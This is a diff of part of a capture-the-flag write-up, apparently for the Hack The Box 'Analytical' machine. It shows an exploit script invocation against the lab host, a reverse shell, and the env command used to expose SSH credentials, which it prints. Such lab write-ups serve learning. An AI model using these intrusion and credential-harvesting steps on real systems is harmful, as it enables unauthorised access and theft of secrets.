@@ -54,11 +54,16 @@ python3 main.py -u http://data.analytical.htb/ -t 249fa03d-fd94-4d5b-b94f-b4ebf3
 
 When I got the reverse shell I did env to see the environnement variables then I found the credentials for ssh :
 
+```
+env
+```
+
+
+![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260306233055.png)
+
+
 username : metalytics
 password : An4lytics_ds20223#
-
-
-![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260306104159.png)
 
 
 ```
